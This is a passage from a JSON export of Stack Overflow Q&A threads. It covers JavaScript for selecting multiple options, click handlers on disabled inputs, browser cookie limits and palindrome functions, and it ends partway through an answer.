                    "body": "<p>This type of thing should be done server-side, so as to limit the amount of resources used on the client for such trivial tasks. That being said, if you were to do it on the front-end, I would encourage you to consider using something like <a href=\"http://underscorejs.org/\" rel=\"nofollow\">underscore.js</a> to keep the code clean and concise:</p>\n\n<pre><code>var values = [\"Red\", \"Green\"],\n    colors = document.getElementById(\"colors\");\n\n_.each(colors.options, function (option) {\n    option.selected = ~_.indexOf(values, option.text);\n});\n</code></pre>\n\n<p>If you're using jQuery, it could be even more terse:</p>\n\n<pre><code>var values = [\"Red\", \"Green\"];\n\n$(\"#colors option\").prop(\"selected\", function () {\n    return ~$.inArray(this.text, values);\n});\n</code></pre>\n\n<p>If you were to do this without a tool like underscore.js or jQuery, you would have a bit more to write, and may find it to be a bit more complicated:</p>\n\n<pre><code>var color, i, j,\n    values = [\"Red\", \"Green\"],\n    options = document.getElementById(\"colors\").options;\n\nfor ( i = 0; i &lt; values.length; i++ ) {\n    for ( j = 0, color = values[i]; j &lt; options.length; j++ ) {\n        options[j].selected = options[j].selected || color === options[j].text;\n    }\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>A pure javascript solution</p>\n\n<pre><code>&lt;select id=\"choice\" multiple=\"multiple\"&gt;\n  &lt;option value=\"1\"&gt;One&lt;/option&gt;\n  &lt;option value=\"2\"&gt;two&lt;/option&gt;\n  &lt;option value=\"3\"&gt;three&lt;/option&gt;\n&lt;/select&gt;\n&lt;script type=\"text/javascript\"&gt;\n\nvar optionsToSelect = ['One', 'three'];\nvar select = document.getElementById( 'choice' );\n\nfor ( var i = 0, l = select.options.length, o; i &lt; l; i++ )\n{\n  o = select.options[i];\n  if ( optionsToSelect.indexOf( o.text ) != -1 )\n  {\n    o.selected = true;\n  }\n}\n\n&lt;/script&gt;\n</code></pre>\n\n<p>Although I agree this should be done server-side.</p>\n",
                    "is_accepted": true,
                    "score": 13
                },
                {
                    "body": "<p>You can get access to the options array of a selected object by going document.getElementById(\"cars\").options where 'cars' is the select object.</p>\n\n<p>Once you have that you can call option[i].setAttribute('selected', 'selected'); to select an option.</p>\n\n<p>I agree with every one else that you are better off doing this server side though.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>&lt;script language=\"JavaScript\" type=\"text/javascript\"&gt;\n&lt;!--\nfunction loopSelected()\n{\n  var txtSelectedValuesObj = document.getElementById('txtSelectedValues');\n  var selectedArray = new Array();\n  var selObj = document.getElementById('selSeaShells');\n  var i;\n  var count = 0;\n  for (i=0; i&lt;selObj.options.length; i++) {\n    if (selObj.options[i].selected) {\n      selectedArray[count] = selObj.options[i].value;\n      count++;\n    }\n  }\n  txtSelectedValuesObj.value = selectedArray;\n}\nfunction openInNewWindow(frm)\n{\n  // open a blank window\n  var aWindow = window.open('', 'Tutorial004NewWindow',\n   'scrollbars=yes,menubar=yes,resizable=yes,toolbar=no,width=400,height=400');\n\n  // set the target to the blank window\n  frm.target = 'Tutorial004NewWindow';\n\n  // submit\n  frm.submit();\n}\n//--&gt;\n&lt;/script&gt;\nThe HTML\n&lt;form action=\"tutorial004_nw.html\" method=\"get\"&gt;\n  &lt;table border=\"1\" cellpadding=\"10\" cellspacing=\"0\"&gt;\n  &lt;tr&gt;\n    &lt;td valign=\"top\"&gt;\n      &lt;input type=\"button\" value=\"Submit\" onclick=\"openInNewWindow(this.form);\" /&gt;\n      &lt;input type=\"button\" value=\"Loop Selected\" onclick=\"loopSelected();\" /&gt;\n      &lt;br /&gt;\n      &lt;select name=\"selSea\" id=\"selSeaShells\" size=\"5\" multiple=\"multiple\"&gt;\n        &lt;option value=\"val0\" selected&gt;sea zero&lt;/option&gt;\n        &lt;option value=\"val1\"&gt;sea one&lt;/option&gt;\n        &lt;option value=\"val2\"&gt;sea two&lt;/option&gt;\n        &lt;option value=\"val3\"&gt;sea three&lt;/option&gt;\n        &lt;option value=\"val4\"&gt;sea four&lt;/option&gt;\n      &lt;/select&gt;\n    &lt;/td&gt;\n    &lt;td valign=\"top\"&gt;\n      &lt;input type=\"text\" id=\"txtSelectedValues\" /&gt;\n      selected array\n    &lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;/table&gt;\n&lt;/form&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have a form with a select box that allows multiple options. After a user saves these options, it stores them in a database table. </p>\n\n<p>I can then read this database table to get the options they chose one again. I need to be able to grab this data from the database, put it into an array, then have the options in that select box to be pre-selected when they go to \"Edit\" their options.</p>\n\n<p>Reading the data into an array is fine, and I know how to make a single option selected within a select box, however I'm not sure how to handle multiple options being selected in javascript.</p>\n\n<p>Can someone help me figure out the javascript required to do this?</p>\n",
            "last_activity_date": 1367213555,
            "question_id": 1295950,
            "score": 10,
            "tags": [
                "javascript",
                "forms",
                "html-select",
                "options"
            ],
            "title": "Javascript to Select Multiple options"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>Enabling a disabled element on click kind of defeats the purpose of disabling, don't you think? If you really want the behavior you're describing, just style it 'disabled' and remove those styles on click.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Don't implement the logic of the onClick event in the onClick's value of the input field. That's probably why it's not working in Firefox. Instead define a function as the onClick's value. For example:</p>\n\n<pre><code>&lt;input type=\"text\" id=\"date_end\" value=\"blah\" onClick=\"doSomething()\" disabled&gt;\n\n&lt;script type=\"text/javascript\"&gt;\n  function doSomething()\n  {\n    alert(\"button pressed\");\n  }\n&lt;/script&gt;\n</code></pre>\n\n<p>It will also be worth looking into JQuery. You can use it to add or remove attributes from elements and all kinds of other stuff. For instance you can remove the disabled from the the input field by writing a function like this:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n      function doSomething()\n      {\n        alert(\"button pressed\");\n         $(\"#date_end\").removeAttr('disabled'); //removes the disabled attribut from the  \n                                                //element whose id is 'date_end'\n      }\n&lt;/script&gt;\n</code></pre>\n\n<p>OR you can add it as follows:</p>\n\n<pre><code>$(\"#date_end\").attr('disabled','true');\n</code></pre>\n\n<p>The Jquery site is <a href=\"http://jquery.com/\" rel=\"nofollow\">here</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I came across this thread in another forum so I assume I'll have to go about it a different way.</p>\n\n<p><a href=\"http://www.webdeveloper.com/forum/showthread.php?t=186057\">http://www.webdeveloper.com/forum/showthread.php?t=186057</a></p>\n\n<blockquote>\n  <p>Firefox, and perhaps other browsers,\n  disable DOM events on form fields that\n  are disabled. Any event that starts at\n  the disabled form field is completely\n  canceled and does not propagate up the\n  DOM tree. Correct me if I'm wrong, but\n  if you click on the disabled button,\n  the source of the event is the\n  disabled button and the click event is\n  completely wiped out. The browser\n  literally doesn't know the button got\n  clicked, nor does it pass the click\n  event on. It's as if you are clicking\n  on a black hole on the web page.</p>\n</blockquote>\n\n<p><strong>Work around:</strong></p>\n\n<ol>\n<li>Style the date fields to look as if\nthey are disabled.</li>\n<li>Make a hidden \"use_date\" form field\nwith a bit value to determine\nwhether to use the date fields during processing.</li>\n<li>Add new function to onClick of the date fields which will\nchange the style class to appear\nenabled and set the \"use_date\" value\nto 1.</li>\n</ol>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>Using jQuery, I attach an event handler to the parents of my input controls. </p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    $(function() {\n        // disable all the input boxes\n        $(\".input\").attr(\"disabled\", true);\n\n        // add handler to re-enable input boxes on click\n        $(\"td:has(.input)\").click(function() {\n            $(\".input\", this).removeAttr(\"disabled\");\n        });\n    });\n&lt;/script&gt;\n</code></pre>\n\n<p>All of my input controls have the class \"input\" and they exist in their own table cells. If you at least wrapped your input tags in a div, then this should work without a table as well. </p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Citing <a href=\"http://www.quirksmode.org/dom/events/click.html\" rel=\"nofollow\">Quirksmode.org</a>:</p>\n\n<p><em>\"A click event on a disabled form field does not fire events in Firefox and Safari. Opera fires the mousedown and mouseup events, but not the click event. IE fires mousedown and mouseup, but not click, on the form. All these implementations are considered correct.\"</em></p>\n\n<p>Quirksmode's compatibility table is great to find out more about such problems.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>You can add a div over the input that is disabled: check it out</p>\n\n<pre><code> &lt;div onclick=\"javascript:document.forma.demo1.disabled=false;\" style=\"border:0px solid black; padding:00px;\"&gt;\n    &lt;input type=text name=\"demo1\" disabled style=\"width:30;\"&gt;\n  &lt;/div&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>In order to enable a disabled element on the client side, lets say in response to a checkbox checked or something, I ended up having to use a combination of JS and jQuery, see below:</p>\n\n<pre><code>//enable the yes &amp; no RB \nfunction enable()\n{\n        var RBNo = \"rbnBusinessType\";\n        var RBYes = \"rbnBusinessType\";\n\n        //jQuery approach to remove disabled from containing spans            \n        $(\"#\" + RBYes).parent().removeAttr('disabled');\n        $(\"#\" + RBNo).parent().removeAttr('disabled');\n\n        //enable yes and no RBs\n        document.getElementById(RBYes).disabled = false;\n        document.getElementById(RBNo).disabled = false;               \n\n}\n</code></pre>\n\n<p>After postback then, you'll need to access the request like the following in order to get at the values of your client side enabled elements:</p>\n\n<p>this._Organization.BusinessTypeHUbZoneSmall = Request.Params[\"rbnBusinessTypeHUbZoneSmall\"] == rbnBusinessTypeHUbZoneSmallYes.ID;</p>\n\n<p>Inspiration taken from:\n<a href=\"http://stackoverflow.com/questions/6995738/asp-javascript-radiobutton-enable-disable-not-included-in-postback-ajax%20for%20more%20information\">http://stackoverflow.com/questions/6995738/asp-javascript-radiobutton-enable-disable-not-included-in-postback-ajax for more information</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>If you simply want to prevent the user from typing data in your field, but instead want the field to <code>populate</code> on an event, my hack solution was to not disable the input field at all, but instead after running my <code>onclick</code> or <code>onfocus</code> functions, to call <code>blur()</code> so the user can not edit the field.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Use <code>readonly</code> instead of <code>disabled</code> </p>\n\n<p>For checkboxes at least, this makes them <em>look</em> disabled but behave normally (tested on Google Chrome).  You'll have to catch the click and prevent the default action of the event as appropriate.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I recently had a very similar problem and solved it by placing the input in a div and moving the onClick to the div.</p>\n\n<pre><code>&lt;div onClick=\"myEnableFunction('date_end');\"&gt;\n&lt;input type=\"text\" id=\"date_end\" value=\"blah\" disabled&gt;\n&lt;/div&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have a form field that starts out disabled and has an onClick to enable it.  The onClick doesn't fire (at least in FF) nor does a simple alert(1);.</p>\n\n<p>The hacky version is to show a fake form field in its place that \"looks\" like it's disabled (grayed out style) and onClick, hide it and show the correct field enabled, but that's ugly.</p>\n\n<p><strong>Example Code</strong></p>\n\n<p>This works:</p>\n\n<pre><code>&lt;input type=\"text\" id=\"date_end\" value=\"blah\" onClick=\"this.disabled=true;\"&gt;\n</code></pre>\n\n<p>This works:</p>\n\n<pre><code>&lt;label for=\"date_end_off\" onClick=\"document.getElementById('date_end').disabled=false\"&gt;Test&lt;/label&gt;\n&lt;input type=\"text\" id=\"date_end\" value=\"blah\" onClick=\"alert(1);\" disabled&gt;\n</code></pre>\n\n<p>This fails:</p>\n\n<pre><code>&lt;input type=\"text\" id=\"date_end\" value=\"blah\" onClick=\"alert(1);\" disabled&gt;\n</code></pre>\n\n<p>This fails:</p>\n\n<pre><code>&lt;input type=\"text\" id=\"date_end\" value=\"blah\" onClick=\"document.getElementById('date_end').disabled=false\" disabled&gt;\n</code></pre>\n",
            "last_activity_date": 1380796953,
            "question_id": 921161,
            "score": 10,
            "tags": [
                "javascript"
            ],
            "title": "Remove disabled attribute onClick of disabled form field"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>The best way would be to not store them in a cookie at all.</p>\n\n<p>Store them in a database, and store the DB key in the cookie.  If it's just a few preferences then security isn't much of an issue.</p>\n\n<p>Don't forget that cookies will be sent with every request - if you have 2kb of cookie data and load 10 images on a page, that's an extra 22kb of data.</p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>IIRC, it's 20 for the majority general, more for some, and 10 for one particular browser (again IIRC, IE5.5?). Up to 10 is considered a safe number.</p>\n\n<p>You don't really need more than one anyway - just use one to store an ID client-side and store everything you need stored server-side against that same ID. Apart from anything else, the less data you leave the the client, the less there is for them to remove/corrupt/hack/etc. </p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>From the <a href=\"http://www.ietf.org/rfc/rfc2109.txt\">rfc</a>:</p>\n\n<ul>\n<li><p>at least 300 cookies</p></li>\n<li><p>at least 4096 bytes per cookie (as measured by the size of the\n    characters that comprise the cookie non-terminal in the syntax\n    description of the Set-Cookie header)</p></li>\n<li><p>at least 20 cookies per unique host or domain name</p></li>\n</ul>\n\n<p>Those are minimum requirements. The IE6 team didn't get that. Everything else is highly browser-specific. You'd better write a test-platform to test each browser. Test the maximum size and number with little incremental steps (and check if they still are readable).</p>\n\n<p>Also, I seem to remember apache has a problem with huges numbers of cookies. Can't remember where i've seen that though.</p>\n\n<p>Here is a little cookie-testing script:\n<a href=\"http://krijnhoetmer.nl/stuff/javascript/maximum-cookies/\">http://krijnhoetmer.nl/stuff/javascript/maximum-cookies/</a></p>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p>You can also store settings in the session, which requires only 1 cookie, but can have a large number of variables.  Like the database, sessions require a bit more storage on the server, but PHP has a good amount of built in management for them.</p>\n",
                    "is_accepted": false,
                    "score": -3
                },
                {
                    "body": "<p>I looked into this today, if you want to support most browsers, then don't exceed 50 cookies per domain, and don't exceed 4095 bytes per domain (i.e. total size of all cookies &lt;= 4095 bytes)</p>\n\n<p>To read more about it, <a href=\"http://myownplayground.atspace.com/cookietest.html\" rel=\"nofollow\">here is the test page and results</a>.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Number of Cookies: </p>\n\n<ul>\n<li>Chrome 9 allowed 180 cookies per domain </li>\n<li>Firefox 3.6.3 allowed 50 cookies per domain </li>\n<li>Internet Explorer 8 allowed 50 cookies per domain</li>\n<li>Opera 10 and 9 allowed 30 cookies per domain</li>\n</ul>\n\n<p>Cookie size Limits (4096 bytes):</p>\n\n<ul>\n<li>Firefox and Safari allow cookies with up to 4097 characters, that\u2019s 4096 for the name and value and one for the equals sign.</li>\n<li>Opera allows cookies with up to 4096 characters, which is for the name, value, and equals sign.</li>\n<li>Internet Explorer allows cookies with up to 4095 characters, which is for the name, value and, equals sign.</li>\n</ul>\n\n<p>SRC: <a href=\"http://webdesign.about.com/od/cookies/f/cookies-per-domain-limit.htm\">http://webdesign.about.com/od/cookies/f/cookies-per-domain-limit.htm</a> and <a href=\"http://www.nczonline.net/blog/2008/05/17/browser-cookie-restrictions/\">http://www.nczonline.net/blog/2008/05/17/browser-cookie-restrictions/</a></p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>Not sure how much sense it makes from their point of view, but <a href=\"http://webcookies.info/number-of-cookies/\" rel=\"nofollow\">I've seen websites in the wild</a> that were setting over 450 cookies and <a href=\"http://webcookies.info/third-party-domains/\" rel=\"nofollow\">reporting to over 140 distinctive third party domains</a>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>As far as Google searches tell me, the maximum allowed number of cookies depends very much on the browser, however I cannot find any recent data as to how much cookies are allowed on modern browsers.</p>\n\n<p>I need to store a somewhat large number of user preferences in cookies (for not-yet-registered users), so what would be the best way of doing that? (Also, those cookies would be accessed both via javascript client-side and php server-side) </p>\n",
            "last_activity_date": 1399587717,
            "question_id": 283774,
            "score": 10,
            "tags": [
                "php",
                "javascript",
                "cookies"
            ],
            "title": "Maximum number of cookies allowed"
        },
        {
            "answer_count": 12,
            "answers": [
                {
                    "body": "<p>Try this:</p>\n\n<pre><code>var isPalindrome = function (string) {\n    if (string == string.split('').reverse().join('')) {\n        alert(string + ' is palindrome.');\n    }\n    else {\n        alert(string + ' is not palindrome.');\n    }\n}\n\ndocument.getElementById('form_id').onsubmit = function() {\n   isPalindrome(document.getElementById('your_input').value);\n}\n</code></pre>\n\n<p>So this script alerts the result, is it palindrome or not. You need to change the <code>your_id</code> with your input id and <code>form_id</code> with your form id to get this work.</p>\n\n<p><a href=\"http://jsfiddle.net/5QYa4/\">Demo!</a></p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>Look at this:</p>\n\n<pre><code>function isPalindrome(word){\n    if(word==null || word.length==0){\n        // up to you if you want true or false here, don't comment saying you \n        // would put true, I put this check here because of \n        // the following i &lt; Math.ceil(word.length/2) &amp;&amp; i&lt; word.length\n        return false;\n    }\n    var lastIndex=Math.ceil(word.length/2);\n    for (var i = 0; i &lt; lastIndex  &amp;&amp; i&lt; word.length; i++) {\n        if (word[i] != word[word.length-1-i]) {\n            return false;\n        }\n     }\n     return true;\n} \n</code></pre>\n\n<p>Edit: now half operation of comparison are performed since I iterate only up to half word to compare it with the last part of the word. Faster for large data!!!</p>\n\n<p>Since the string is an array of char no need to use charAt functions!!!</p>\n\n<p>Reference: <a href=\"http://wiki.answers.com/Q/Javascript_code_for_palindrome\" rel=\"nofollow\">http://wiki.answers.com/Q/Javascript_code_for_palindrome</a></p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<pre><code>function palindrome(str) {\n    var len = str.length;\n    for ( var i = 0; i &lt; Math.floor(len/2); i++ ) {\n        if (str[i] !== str[len - 1 - i]) {\n            return false;\n        }\n    }\n    return true;\n}\n</code></pre>\n\n<p><code>palindrome</code> will return if specified word is palindrome, based on <code>boolean</code> value (true/false)</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p><strong>I opened bounty on this question due to performance</strong> and I've done research and here are the results:</p>\n\n<p>If we are dealing with very large amount of data like</p>\n\n<pre><code>var abc = \"asdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfdasdhfkahkjdfhkaksjdfhaksdfjhakjddfhkjahksdhfaiuyqewiuryiquweyriyqiuweyriuqiuweryiquweyriuqyweirukajsdhfkahdfjkhakjsdhfkahksdhfakhdjkfqwiueryqiueyriuasdkfjhakjhdfkjashfkajhsdfkjahsdkalsdjflkasjdfljqoiweurasldjflasfd\";\n\nfor ( var i = 0; i &lt; 10; i++ ) {\n    abc += abc;  // making string even more larger\n}\n\nfunction reverse(s) { // using this method for second half of string to be embedded\n    return s.split(\"\").reverse().join(\"\");\n}\n\nabc += reverse(abc); // adding second half string to make string true palindrome\n</code></pre>\n\n<p><strong>In this example palindrome is True, just to note</strong></p>\n\n<p>Posted palindrome function gives us time from 180 to 210 Milliseconds (in current example), and the function posted below\nwith <code>string == string.split('').reverse().join('')</code> method gives us 980 to 1010 Milliseconds.</p>\n\n<blockquote>\n  <p>Machine Details:</p>\n  \n  <p><strong>System:</strong>      Ubuntu 13.10\n  <strong>OS Type:</strong>     32 Bit\n  <strong>RAM:</strong>         2 Gb\n  <strong>CPU:</strong>         3.4 Ghz*2\n  <strong>Browser:</strong>     Firefox 27.0.1</p>\n</blockquote>\n",
                    "is_accepted": true,
                    "score": 17
                },
                {
                    "body": "<p>Use something like this</p>\n\n<pre><code>function isPalindrome(s) {\n    return s == s.split(\"\").reverse().join(\"\") ? true : false;\n}\n\nalert(isPalindrome(\"noon\"));\n</code></pre>\n\n<p>alternatively the above code can be optimized as [updated after rightfold's comment]</p>\n\n<pre><code>function isPalindrome(s) {\n    return s == s.split(\"\").reverse().join(\"\");\n}\n\nalert(isPalindrome(\"malayalam\")); \nalert(isPalindrome(\"english\")); \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Faster Way:</p>\n\n<p>-Compute half the way in loop.</p>\n\n<p>-Store length of the word in a variable instead of calculating every time.</p>\n\n<p>EDIT:\nStore word length/2 in a temporary variable as not to calculate every time in the loop as pointed out by (mvw) .</p>\n\n<pre><code>function isPalindrome(word){\n   var i,wLength = word.length-1,wLengthToCompare = wLength/2;\n\n   for (i = 0; i &lt;= wLengthToCompare ; i++) {\n     if (word.charAt(i) != word.charAt(wLength-i)) {\n        return false;\n     }\n   }\n   return true;\n} \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Best Way to check string is palindrome with more criteria like case and special characters...</p>\n\n<p><code>function checkPalindrom(str) {\n    var str = str.replace(/[^a-zA-Z0-9]+/gi, '').toLowerCase();\n    return str == str.split('').reverse().join('');\n}</code></p>\n\n<p>You can test it with following words and strings and gives you more specific result.<br/>\n1. bob<br/>\n2. Doc, note, I dissent. A fast never prevents a fatness. I diet on cod</p>\n\n<p>For strings it ignores special characters and convert string to lower case.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Taking a stab at this. Kind of hard to measure performance, though.</p>\n\n<pre><code>function palin(word) {\n    var i = 0,\n        len = word.length - 1,\n        max = word.length / 2 | 0;\n\n    while (i &lt; max) {\n        if (word.charCodeAt(i) !== word.charCodeAt(len - i)) {\n            return false;\n        }\n        i += 1;\n    }\n    return true;\n}\n</code></pre>\n\n<p>My thinking is to use <code>charCodeAt()</code> instead <code>charAt()</code> with the hope that allocating a <code>Number</code> instead of a <code>String</code> will have better perf because <code>String</code>s are variable length and might be more complex to allocate. Also, only iterating halfway through (<a href=\"http://stackoverflow.com/a/22198226/1888292\">as noted by sai</a>) because that's all that's required. Also, if the length is odd (ex: <code>'aba'</code>), the middle character is always ok.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Let us start from the recursive definition of a palindrome:</p>\n\n<ol>\n<li>The empty string '' is a palindrome</li>\n<li>The string consisting of the character c, thus 'c', is a palindrome</li>\n<li>If the string s is a palindrome, then the string 'c' + s + 'c' for some character c is a palindrome </li>\n</ol>\n\n<p>This definition can be coded straight into JavaScript:</p>\n\n<pre><code>function isPalindrome(s) {\n  var len = s.length;\n  // definition clauses 1. and 2.\n  if (len &lt; 2) {\n    return true;\n  }\n  // note: len &gt;= 2\n  // definition clause 3.\n  if (s[0] != s[len - 1]) {\n    return false;\n  }\n  // note: string is of form s = 'a' + t + 'a'\n  // note: s.length &gt;= 2 implies t.length &gt;= 0\n  var t = s.substr(1, len - 2);\n  return isPalindrome(t);\n}\n</code></pre>\n\n<p>Here is some additional test code for MongoDB's <em>mongo</em> JavaScript shell, in a web browser with debugger replace <em>print()</em> with <em>console.log()</em></p>\n\n<pre><code>function test(s) {\n  print('isPalindrome(' + s + '): ' + isPalindrome(s));\n}\n\ntest('');\ntest('a');\ntest('ab');\ntest('aa');\ntest('aab');\ntest('aba');\ntest('aaa');\ntest('abaa');\ntest('neilarmstronggnortsmralien');\ntest('neilarmstrongxgnortsmralien');\ntest('neilarmstrongxsortsmralien');\n</code></pre>\n\n<p>I got this output:</p>\n\n<pre><code>$ mongo 